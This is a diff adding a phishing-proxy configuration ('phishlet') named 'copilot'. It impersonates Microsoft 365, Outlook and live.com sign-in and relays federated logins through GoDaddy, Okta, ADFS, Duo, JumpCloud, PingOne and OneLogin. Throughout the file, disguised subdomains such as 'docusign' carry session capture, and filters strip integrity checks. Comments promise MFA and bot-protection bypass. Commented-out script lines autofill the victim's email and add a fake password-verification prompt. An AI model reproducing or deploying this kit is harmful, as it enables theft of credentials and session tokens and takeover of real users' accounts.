@@ -1,0 +1,998 @@
+name: "copilot"
+author: "Christ-Link"
+min_ver: "3.0.0"
+
+# =========================================================================
+# FEDERATION PROVIDER PARAMS (Optional - set to enable provider support)
+# =========================================================================
+# By default this phishlet works as a standard O365 phishlet.
+# Set params to activate federation provider bypass:
+#
+#   phishlets param o365 okta_org <org_name>     # Okta (e.g., contoso)
+#   phishlets param o365 adfs_sub <subdomain>     # ADFS subdomain (e.g., sts, adfs)
+#   phishlets param o365 adfs_domain <domain>     # ADFS domain (e.g., contoso.com)
+#   phishlets param o365 duo_api <api_host>       # Duo API (e.g., api-a1b2c3d4)
+#   phishlets param o365 duo_sso <sso_host>       # Duo SSO (e.g., sso-a1b2c3d4.sso)
+#
+params:
+  - name: okta_org
+    default: 'disabled'
+  - name: adfs_sub
+    default: 'disabled'
+  - name: adfs_domain
+    default: 'disabled.local'
+  - name: duo_api
+    default: 'disabled'
+  - name: duo_sso
+    default: 'disabled'
+
+rewrite_urls:
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/oauth2/v2.0/authorize']
+    rewrite:
+      path: '/oauth'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # Personal Microsoft accounts (Hotmail, Outlook, Live) use login.live.com
+  - trigger:
+      domains: ['login.live.com']
+      paths: ['/oauth20_authorize.srf']
+    rewrite:
+      path: '/oauth'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # Alternative personal account paths
+  - trigger:
+      domains: ['login.live.com']
+      paths: ['/oauth20_authorize']
+    rewrite:
+      path: '/oauth'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['login.live.com']
+      paths: ['/ppsecure/post.srf']
+    rewrite:
+      path: '/auth'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # GoDaddy SSO - OAuth/SAML flows
+  - trigger:
+      domains: ['sso.godaddy.com']
+      paths: ['/login', '/authorize', '/oauth/authorize', '/saml2/idp/SSOService.php']
+    rewrite:
+      path: '/sso'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['idp.godaddy.com']
+      paths: ['/login', '/authorize', '/oauth/authorize', '/saml2/idp/SSOService.php']
+    rewrite:
+      path: '/idp'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['login.godaddy.com']
+      paths: ['/login', '/authorize', '/oauth/authorize', '/signin']
+    rewrite:
+      path: '/gd'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # SecureServer.net SSO - GoDaddy backend
+  - trigger:
+      domains: ['sso.secureserver.net']
+      paths: ['/login', '/authorize', '/oauth/authorize', '/saml2/idp/SSOService.php']
+    rewrite:
+      path: '/ss'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['idp.secureserver.net']
+      paths: ['/login', '/authorize', '/oauth/authorize']
+    rewrite:
+      path: '/ssi'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['login.secureserver.net']
+      paths: ['/login', '/authorize', '/signin']
+    rewrite:
+      path: '/ssl'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['auth.secureserver.net']
+      paths: ['/login', '/authorize', '/oauth/authorize']
+    rewrite:
+      path: '/ssa'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # =========================================================================
+  # OKTA - Obfuscate auth landing paths
+  # =========================================================================
+  - trigger:
+      domains: ['{okta_org}.okta.com']
+      paths: ['/login/login.htm', '/login/token/redirect', '/oauth2/v1/authorize', '/oauth2/default/v1/authorize']
+    rewrite:
+      path: '/ok'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # =========================================================================
+  # ADFS - Obfuscate WS-Fed and OAuth2 auth paths
+  # =========================================================================
+  - trigger:
+      domains: ['{adfs_sub}.{adfs_domain}']
+      paths: ['/adfs/ls/', '/adfs/ls/wia', '/adfs/oauth2/authorize', '/adfs/ls/IdpInitiatedSignOn.aspx']
+    rewrite:
+      path: '/ad'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # =========================================================================
+  # DUO SECURITY - Obfuscate Universal Prompt and SSO paths
+  # =========================================================================
+  - trigger:
+      domains: ['{duo_api}.duosecurity.com']
+      paths: ['/frame/frameless/v4/auth', '/frame/v4/auth/prompt', '/frame/v4/auth']
+    rewrite:
+      path: '/du'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['{duo_sso}.duosecurity.com']
+      paths: ['/saml2/sp/sso', '/login']
+    rewrite:
+      path: '/ds'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # =========================================================================
+  # JUMPCLOUD - Obfuscate SAML SSO paths
+  # =========================================================================
+  - trigger:
+      domains: ['sso.jumpcloud.com']
+      paths: ['/login', '/saml2/auth']
+    rewrite:
+      path: '/jc'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # =========================================================================
+  # PINGONE - Obfuscate authorize and SAML paths
+  # =========================================================================
+  - trigger:
+      domains: ['auth.pingone.com']
+      paths: ['/authorize', '/as/authorize']
+    rewrite:
+      path: '/pg'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # =========================================================================
+  # ONELOGIN - Obfuscate trust/auth paths
+  # =========================================================================
+  - trigger:
+      domains: ['app.onelogin.com']
+      paths: ['/login', '/trust/saml2/launch', '/trust/wsfed/launch', '/access/auth']
+    rewrite:
+      path: '/ol'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['login.onelogin.com']
+      paths: ['/login', '/trust/saml2/launch', '/trust/wsfed/launch']
+    rewrite:
+      path: '/oll'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  # =========================================================================
+  # OUTLOOK.LIVE.COM - Personal account landing paths
+  # =========================================================================
+  - trigger:
+      domains: ['outlook.live.com']
+      paths: ['/owa/', '/mail/', '/owa/auth/logon.aspx']
+    rewrite:
+      path: '/lv'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+proxy_hosts:
+  - { phish_sub: "secure", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "docusign", orig_sub: "www", domain: "office.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "hervw", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hervw2", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "hcwdg", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hterw", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hrvetbr", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hnrvrve", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hvr34gr", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+#
+  - { phish_sub: "jrhte", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
+  - { phish_sub: "htejre", orig_sub: "aadcdn", domain: "msftauth.net", session: true, is_landing: false }
+#
+  - { phish_sub: "sign", orig_sub: "outlook", domain: "office.com", session: false, is_landing: true, auto_filter: false }
+  - { phish_sub: "cloud", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "adobesign", orig_sub: "go", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "roweri", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  # -------------------------------------------------------------------------
+  # GODADDY SSO - Full federated auth support (from office.yaml)
+  # -------------------------------------------------------------------------
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'idp', orig_sub: 'idp', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mya', orig_sub: 'mya', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'events-api', orig_sub: 'events.api', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: true}
+  # WSIMG CDN - img6 is the primary observed CDN
+  - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'img6', orig_sub: 'img6', domain: 'wsimg.com', session: false, is_landing: false, auto_filter: false}
+  # SecureServer.net - GoDaddy's authentication backend
+  - {phish_sub: 'sso-ss', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'idp-ss', orig_sub: 'idp', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login-ss', orig_sub: 'login', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'auth-ss', orig_sub: 'auth', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'csp-ss', orig_sub: 'csp', domain: 'secureserver.net', session: false, is_landing: false, auto_filter: false}
+  # Kasada Fingerprint - CRITICAL for bot protection bypass
+  - {phish_sub: 'g-sst', orig_sub: 'g.sst', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: true}
+  # CDN
+  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
+  # =========================================================================
+  # OKTA - Federation support (set 'okta_org' param to enable)
+  # When disabled (default), proxy_host resolves to disabled.okta.com (inert)
+  # =========================================================================
+  - {phish_sub: 'okta', orig_sub: '{okta_org}', domain: 'okta.com', session: true, is_landing: false, auto_filter: true}
+  # Okta CDN - Shared (always active for any Okta federation)
+  - {phish_sub: 'ok14cdn', orig_sub: 'ok14static', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ok9cdn', orig_sub: 'ok9static', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+  # =========================================================================
+  # ADFS - Federation support (set 'adfs_sub' + 'adfs_domain' params)
+  # When disabled (default), resolves to disabled.disabled.local (inert)
+  # =========================================================================
+  - {phish_sub: 'adfs', orig_sub: '{adfs_sub}', domain: '{adfs_domain}', session: true, is_landing: false, auto_filter: true}
+  # =========================================================================
+  # DUO SECURITY - MFA bypass (set 'duo_api' and/or 'duo_sso' params)
+  # When disabled (default), resolves to disabled.duosecurity.com (inert)
+  # =========================================================================
+  - {phish_sub: 'duo-api', orig_sub: '{duo_api}', domain: 'duosecurity.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'duo-sso', orig_sub: '{duo_sso}', domain: 'duosecurity.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'duo-static', orig_sub: 'static', domain: 'duosecurity.com', session: false, is_landing: false, auto_filter: true}
+  # =========================================================================
+  # JUMPCLOUD - Shared domain (always active, no params needed)
+  # =========================================================================
+  - {phish_sub: 'jc-sso', orig_sub: 'sso', domain: 'jumpcloud.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'jc-auth', orig_sub: 'auth', domain: 'jumpcloud.com', session: true, is_landing: false, auto_filter: true}
+  # =========================================================================
+  # PINGONE CLOUD - Shared domain (always active, no params needed)
+  # =========================================================================
+  - {phish_sub: 'ping-auth', orig_sub: 'auth', domain: 'pingone.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ping-assets', orig_sub: 'assets', domain: 'pingone.com', session: false, is_landing: false, auto_filter: true}
+  # =========================================================================
+  # ONELOGIN - Shared endpoints (always active, no params needed)
+  # =========================================================================
+  - {phish_sub: 'ol-app', orig_sub: 'app', domain: 'onelogin.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ol-login', orig_sub: 'login', domain: 'onelogin.com', session: true, is_landing: false, auto_filter: true}
+  # =========================================================================
+  # AUTH0 - Shared CDN (always active, no params needed)
+  # =========================================================================
+  - {phish_sub: 'a0-cdn', orig_sub: 'cdn', domain: 'auth0.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.microsoft.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "crossorigin", replace: "rickorigin", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html",  "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>window.addEventListener("load",()=>{function e(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}e("#i0116").then(e=>{if(0==window.location.hash.length)return;e.focus();let t;t="="==window.location.hash.slice(-1)?window.location.hash.slice(1,-1):window.location.hash.slice(1),e.value=t;let o=document.querySelector("#idSIButton9");o.focus(),o.click()}),e("#loginHeader").then(e=>{if !e.querySelector("p")) let t=document.createElement("p");t.textContent="Because you are accessing sensitive info you need to verify your password",document.querySelectorAll("#loginHeader")[0].appendChild(t)})});</script>', mimes: ["text/html"] }
+  # - { triggers_on: "outlook.office.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>window.addEventListener("load",()=>{function e(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}e("#i0116").then(e=>{if(0==window.location.hash.length)return;e.focus();let t;t="="==window.location.hash.slice(-1)?window.location.hash.slice(1,-1):window.location.hash.slice(1),e.value=t;let o=document.querySelector("#idSIButton9");o.focus(),o.click()}),e("#loginHeader").then(e=>{if (!e.querySelector("p")) let t=document.createElement("p");t.textContent="Because you are accessing sensitive info you need to verify your password",document.querySelectorAll("#loginHeader")[0].appendChild(t)})});</script>', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msauth.net",   search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "outlook.office365.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoft.com", orig_sub: "", domain: "", search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title></title>", mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '</head>', replace: '<style>.background-logo-holder{visibility:hidden}</style></HEAD>', mimes: ["text/html"] }
+
+  # - {
+  #     triggers_on: "login.microsoftonline.com",
+  #     orig_sub: "",
+  #     domain: "",
+  #     search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"',
+  #     replace: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: ''unsafe-inline'' ''unsafe-eval''; script-src * data: blob: ''unsafe-inline'' ''unsafe-eval''; connect-src * data: blob: ''unsafe-inline''; img-src * data: blob: ''unsafe-inline''; frame-src * data: blob: ; style-src * data: blob: ''unsafe-inline''; font-src * data: blob: ''unsafe-inline'';"',
+  # s: ["text/html"],
+  #   }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+##
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  ##
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # OUTLOOK.LIVE.COM - Personal account cross-domain rewrites
+  - { triggers_on: "outlook.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "", domain: "", search: "crossorigin", replace: "rickorigin", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.live.com", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
